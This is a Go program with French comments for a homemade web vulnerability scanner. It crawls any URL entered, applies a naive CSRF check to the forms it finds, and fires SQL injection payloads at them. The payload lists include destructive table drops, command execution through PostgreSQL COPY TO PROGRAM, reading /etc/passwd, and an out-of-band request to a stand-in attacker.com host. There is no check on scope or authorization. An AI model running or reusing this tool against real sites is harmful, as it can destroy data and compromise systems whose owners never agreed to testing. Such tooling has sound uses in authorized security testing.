package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"golang.org/x/net/html"
)

// Structure pour stocker les détails des éléments de page (form, link, input, etc.)
type PageElement struct {
	ElementType string   `json:"element_type"` // "form", "link", "input", "textarea", etc.
	Attribute   string   `json:"attribute"`    // Attribut de l'élément, par ex. action pour les forms
	Content     string   `json:"content"`      // Contenu de l'attribut
	Inputs      []string `json:"inputs,omitempty"` // Champs input pour chaque formulaire
	CSRFStatus  string   `json:"csrf_status,omitempty"` // Statut CSRF : Sécurisé ou Non sécurisé
}

// Structure pour stocker les résultats d'un scan de sécurité
type SecurityReport struct {
	ID      string        `json:"id"`
	URL     string        `json:"url"`
	Date    string        `json:"date"`
	Results []PageElement `json:"results"`
}

// Fonction pour parcourir et extraire les éléments de la page web
func crawlAndExtract(site string) ([]PageElement, error) {
	resp, err := http.Get(site)
	if err != nil {
		return nil, fmt.Errorf("erreur lors de la requête: %v", err)
	}
	defer resp.Body.Close()

	baseURL, err := url.Parse(site)
	if err != nil {
		return nil, fmt.Errorf("erreur lors de l'analyse de l'URL: %v", err)
	}

	// Extraire les éléments de la page
	elements, err := extractPageElements(resp, baseURL)
	if err != nil {
		return nil, fmt.Errorf("erreur lors de l'extraction des éléments: %v", err)
	}

	return elements, nil
}

// Fonction pour extraire les URLs, forms, inputs, et event handlers de la page HTML
func extractPageElements(resp *http.Response, baseURL *url.URL) ([]PageElement, error) {
	var elements []PageElement
	z := html.NewTokenizer(resp.Body)

	var currentForm PageElement

	for {
		tt := z.Next()
		switch tt {
		case html.ErrorToken:
			return elements, nil
		case html.StartTagToken, html.SelfClosingTagToken:
			t := z.Token()

			// Extraction des balises <a> (liens)
			if t.Data == "a" {
				for _, attr := range t.Attr {
					if attr.Key == "href" {
						link, err := baseURL.Parse(attr.Val)
						if err != nil {
							continue
						}
						elements = append(elements, PageElement{
							ElementType: "link",
							Attribute:   "href",
							Content:     link.String(),
						})
					}
				}
			}

			// Extraction des balises <form>
			if t.Data == "form" {
				currentForm = PageElement{
					ElementType: "form",
					Attribute:   "action",
				}
				for _, attr := range t.Attr {
					if attr.Key == "action" {
						formAction, err := baseURL.Parse(attr.Val)
						if err != nil {
							continue
						}
						currentForm.Content = formAction.String()
					}
				}
			}

			// Extraction des balises <input>
			if t.Data == "input" || t.Data == "textarea" {
				inputName := ""
				isCSRFInput := false
				for _, attr := range t.Attr {
					if attr.Key == "name" {
						inputName = attr.Val
						if strings.Contains(strings.ToLower(inputName), "csrf") {
							isCSRFInput = true
						}
					}
				}
				currentForm.Inputs = append(currentForm.Inputs, inputName)
				if isCSRFInput {
					currentForm.CSRFStatus = "Sécurisé"
				}
			}

			// Fin de la balise form (ajouter les détails du form au tableau)
		case html.EndTagToken:
			t := z.Token()
			if t.Data == "form" {
				if currentForm.CSRFStatus == "" {
					currentForm.CSRFStatus = "Non sécurisé (Pas de CSRF)"
				}
				elements = append(elements, currentForm)
			}
		}
	}
}

// Fonction pour générer un identifiant unique
func generateID() string {
	return fmt.Sprintf("scan-%d", time.Now().UnixNano())
}

// Fonction pour sauvegarder le rapport de sécurité en JSON
func saveReport(report SecurityReport) error {
	// Lire le fichier JSON existant
	var reports []SecurityReport

	fileData, err := os.ReadFile("security_reports.json")
	if err == nil && len(fileData) > 0 {
		// Décoder les données existantes
		err = json.Unmarshal(fileData, &reports)
		if err != nil {
			return fmt.Errorf("erreur lors du parsing du fichier JSON: %v", err)
		}
	}

	// Ajouter le nouveau rapport
	reports = append(reports, report)

	// Encoder la nouvelle liste de rapports
	data, err := json.MarshalIndent(reports, "", "  ")
	if err != nil {
		return fmt.Errorf("erreur lors de la conversion en JSON: %v", err)
	}

	// Sauvegarder dans le fichier
	err = os.WriteFile("security_reports.json", data, 0644)
	if err != nil {
		return fmt.Errorf("erreur lors de l'écriture du fichier: %v", err)
	}

	return nil
}
// Fonction pour charger et retourner un rapport de sécurité par ID
	func loadReportByID(scanID string) (*SecurityReport, error) {
		// Lire le fichier JSON qui contient les rapports
		data, err := os.ReadFile("security_reports.json")
		if err != nil {
			return nil, fmt.Errorf("erreur lors de la lecture du fichier JSON: %v", err)
		}

		// Décoder le contenu du fichier JSON dans un tableau de SecurityReport
		var reports []SecurityReport
		err = json.Unmarshal(data, &reports)
		if err != nil {
			return nil, fmt.Errorf("erreur lors du parsing du fichier JSON: %v", err)
		}

		// Rechercher le rapport qui correspond à l'ID fourni
		for _, report := range reports {
			if report.ID == scanID {
				// Retourner le rapport trouvé
				return &report, nil
			}
		}

		// Si aucun rapport n'a été trouvé pour l'ID donné
		return nil, fmt.Errorf("aucun rapport trouvé pour l'ID: %s", scanID)
	}


func injectionBDDTest(elements []PageElement) ([]PageElement, error) {
	// SQL Injection payloads categorized by different DBMS
	var sqlInjectionPayloads = map[string][]string{
		"MySQL": {
			"' OR '1'='1' --",
			"' OR 1=1 --",
			"' UNION SELECT null, version() --",
			"1' UNION SELECT 1,2,3,4 --",
			"' OR SLEEP(5) --",
			"' AND IF(1=1, SLEEP(5), 0) --",
			"' OR LOAD_FILE('/etc/passwd') --",
			"' AND 1=0 UNION SELECT table_name FROM information_schema.tables --",
		},
		"PostgreSQL": {
			"' OR '1'='1' --",
			"' OR 1=1 --",
			"' UNION SELECT null, version() --",
			"'; DROP TABLE users; --",
			"'; COPY (SELECT '') TO PROGRAM 'cmd.exe' --",
			"'; SELECT pg_sleep(5) --",
			"' OR CAST(pg_sleep(10) AS INTEGER) --",
		},
		"MSSQL": {
			"' OR '1'='1' --",
			"' OR 1=1 --",
			"'; EXEC sp_MSForEachTable 'DROP TABLE ?' --",
			"' UNION SELECT null, @@version --",
			"'; WAITFOR DELAY '0:0:5' --",
			"'; SELECT * FROM sys.tables --",
			"' UNION SELECT table_name FROM information_schema.tables --",
		},
		"Oracle": {
			"' OR '1'='1' --",
			"' OR 1=1 --",
			"' UNION SELECT null, banner FROM v$version --",
			"' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost') --",
			"' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS' --",
			"' UNION SELECT null FROM dual --",
			"' OR 1=UTL_HTTP.REQUEST('http://attacker.com') --",
		},
	}
		// Variable to store detected vulnerabilities
		detectedVulnDBMS := ""

		// Iterate over each element
		for _, el := range elements {
			// If a vulnerability is already found, only test against that DBMS
			dbmsToTest := []string{}
			if detectedVulnDBMS == "" {
				// Test against all DBMS types if no vulnerability found yet
				for dbms := range sqlInjectionPayloads {
					dbmsToTest = append(dbmsToTest, dbms)
				}
			} else {
				// Only test the DBMS where the vulnerability was found
				dbmsToTest = append(dbmsToTest, detectedVulnDBMS)
			}
	
			// Test inputs or forms
			if el.ElementType == "input" {
				// Test input parameters (URL parameters)
				for _, dbms := range dbmsToTest {
					for _, payload := range sqlInjectionPayloads[dbms] {
						vulnerable, err := testSQLInjectionInURL(el.Content, payload)
						if err != nil {
							log.Printf("Error during SQLi test: %v\n", err)
							continue
						}
						if vulnerable {
							fmt.Printf("SQL Injection vulnerability found in input: %s (DBMS: %s, Payload: %s)\n", el.Content, dbms, payload)
							detectedVulnDBMS = dbms
							break
						}
					}
					if detectedVulnDBMS != "" {
						break
					}
				}
			} else if el.ElementType == "form" {
				// Test form submissions
				for _, dbms := range dbmsToTest {
					for _, input := range el.Inputs {
						for _, payload := range sqlInjectionPayloads[dbms] {
							vulnerable, err := testSQLInjectionInForm(el.Content, input, payload)
							if err != nil {
								log.Printf("Error during SQLi test: %v\n", err)
								continue
							}
							if vulnerable {
								fmt.Printf("SQL Injection vulnerability found in form: %s (DBMS: %s, Input: %s, Payload: %s)\n", el.Content, dbms, input, payload)
								detectedVulnDBMS = dbms
								break
							}
						}
						if detectedVulnDBMS != "" {
							break
						}
					}
					if detectedVulnDBMS != "" {
						break
					}
				}
			}
		}

	return elements, nil
}
// Function to test SQL Injection in URL parameters dynamically
func testSQLInjectionInURL(rawURL, payload string) (bool, error) {
	// Parse the URL to extract query parameters
	parsedURL, err := url.Parse(rawURL)
	if err != nil {
		return false, fmt.Errorf("error parsing URL: %v", err)
	}

	// Get the query parameters
	params := parsedURL.Query()

	// Iterate over each query parameter and inject the SQL payload
	for paramName := range params {
		// Inject the SQL payload into the current parameter
		params.Set(paramName, urlEncode(payload))
		parsedURL.RawQuery = params.Encode()

		// Construct the final injected URL
		injectedURL := parsedURL.String()

		// Display the URL being tested
		fmt.Printf("Testing URL: %s with payload: %s\n", injectedURL, payload)

		// Perform the HTTP GET request
		resp, err := http.Get(injectedURL)
		if err != nil {
			return false, fmt.Errorf("error during GET request: %v", err)
		}
		defer resp.Body.Close()

		// Analyze the response status code
		if resp.StatusCode == http.StatusInternalServerError || resp.StatusCode == http.StatusServiceUnavailable {
			// Potential vulnerability, server returned error status code
			return true, nil
		}

		// Read the response body
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return false, fmt.Errorf("error reading response body: %v", err)
		}

		// Check for common SQL error messages in the response
		if strings.Contains(string(body), "SQL syntax") || strings.Contains(string(body), "database error") || strings.Contains(string(body), "unclosed quotation mark") {
			return true, nil
		}
	}

	return false, nil
}
// Function to test SQL Injection in form submissions with more checks
func testSQLInjectionInForm(action, input, payload string) (bool, error) {
	// Construct the POST data with the SQL Injection payload
	postData := fmt.Sprintf("%s=%s", input, urlEncode(payload))

	// Display the form action URL and the payload being tested
	fmt.Printf("Testing form action: %s with input: %s and payload: %s\n", action, input, payload)

	// Perform the HTTP POST request
	resp, err := http.Post(action, "application/x-www-form-urlencoded", strings.NewReader(postData))
	if err != nil {
		return false, fmt.Errorf("error during POST request: %v", err)
	}
	defer resp.Body.Close()

	// Analyze the response status code
	if resp.StatusCode == http.StatusInternalServerError || resp.StatusCode == http.StatusServiceUnavailable {
		// Potential vulnerability, server returned error status code
		return true, nil
	}

	// Read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, fmt.Errorf("error reading response body: %v", err)
	}

	// Check for common SQL error messages in the response
	if strings.Contains(string(body), "SQL syntax") || strings.Contains(string(body), "database error") || strings.Contains(string(body), "unclosed quotation mark") {
		return true, nil
	}

	return false, nil
}

// Function to URL encode payloads for safe transmission
func urlEncode(payload string) string {
    return url.QueryEscape(payload)
}

func extractReportByID(scanID string) error {
	// Load the security report by ID
	report, err := loadReportByID(scanID)
	if err != nil {
		return fmt.Errorf("error loading report: %v", err)
	}

	// Test for SQL Injection vulnerabilities
	_, err = injectionBDDTest(report.Results)
	if err != nil {
		return fmt.Errorf("error testing for SQL Injection: %v", err)
	}

	return nil
}


func init() {
	// Créer un fichier JSON vide pour stocker les rapports de sécurité
	if _, err := os.Stat("security_reports.json"); os.IsNotExist(err) {
		file, err := os.Create("security_reports.json")
		if err != nil {
			log.Fatalf("Erreur lors de la création du fichier JSON: %v", err)
		}
		defer file.Close()
	}
}

func main() {
	for {
		// Demander à l'utilisateur de choisir une option
		fmt.Println("Tapez 1 pour analyser un site, 2 pour extraire les rapports de sécurité ou 3 pour tester une fail d'injection sur un report :")
		var choice int
		fmt.Scan(&choice)

		if choice == 1 {
			var site string
			validURL := false

			// Boucle pour redemander une URL valide avec http ou https
			for !validURL {
				// Demander l'URL du site
				fmt.Println("Entrez le lien du site à analyser (avec http:// ou https://) :")
				fmt.Scan(&site)

				// Vérifier si l'URL commence par http ou https
				if strings.HasPrefix(site, "http://") || strings.HasPrefix(site, "https://") {
					validURL = true
				} else {
					fmt.Println("Erreur: Veuillez entrer une URL valide qui commence par http:// ou https://.")
				}
			}

			// Parcourir et extraire les éléments de la page une fois que l'URL est valide
			elements, err := crawlAndExtract(site)
			if err != nil {
				log.Fatalf("Erreur : %v", err)
			}

			// Générer un rapport de sécurité
			report := SecurityReport{
				ID:      generateID(),
				URL:     site,
				Date:    time.Now().Format("2006-01-02 15:04:05"),
				Results: elements,
			}

			// Sauvegarder le rapport dans un fichier JSON
			if err := saveReport(report); err != nil {
				log.Fatalf("Erreur lors de la sauvegarde du rapport: %v", err)
			}

			// Afficher l'ID unique du scan
			fmt.Printf("Analyse terminée avec succès. ID du scan : %s\n", report.ID)
			// Requête pour continuer ou quitter
			fmt.Println("Voulez-vous continuer ? Tapez 1 pour continuer et 0 pour quitter :")
			fmt.Scan(&choice)

			if choice == 0 {
				break
			}
		} else if choice == 2 {
			// Demander l'ID du scan
			fmt.Println("Entrez l'ID du scan que vous souhaitez afficher :")
			var scanID string
			fmt.Scan(&scanID)

			// Charger et afficher le rapport par ID
			report, err := loadReportByID(scanID)
			if err != nil {
				fmt.Printf("Erreur : %v\n", err)
			}
			fmt.Printf("ID du scan : %s\n", report.ID)
			fmt.Printf("URL : %s\n", report.URL)
			fmt.Printf("Date : %s\n", report.Date)
			fmt.Println("Résultats :")
			for _, el := range report.Results {
				fmt.Printf("Type d'élément : %s\n", el.ElementType)
				fmt.Printf("Attribut : %s\n", el.Attribute)
				fmt.Printf("Contenu : %s\n", el.Content)
				if el.ElementType == "form" {
					fmt.Printf("Champs d'entrée : %v\n", el.Inputs)
					fmt.Printf("Statut CSRF : %s\n", el.CSRFStatus)
				}
				fmt.Println("----")
			}

			// Requête pour continuer ou quitter
			fmt.Println("Voulez-vous continuer ? Tapez 1 pour continuer et 0 pour quitter :")
			fmt.Scan(&choice)

			if choice == 0 {
				break
			}
		} else if choice == 3 {
			// Demander l'ID du scan
			fmt.Println("Entrez l'ID du scan que vous souhaitez tester pour les injections SQL :")
			var scanID string
			fmt.Scan(&scanID)

			// Charger et analyser le rapport par ID
			err := extractReportByID(scanID)
			if err != nil {
				fmt.Printf("Erreur : %v\n", err)
			}
			// Requête pour continuer ou quitter
			fmt.Println("Voulez-vous continuer ? Tapez 1 pour continuer et 0 pour quitter :")
			fmt.Scan(&choice)

			if choice == 0 {
				break
			}
		} else {
			fmt.Println("Choix invalide. Veuillez entrer 1 ou 2.")
		} 
	}
}
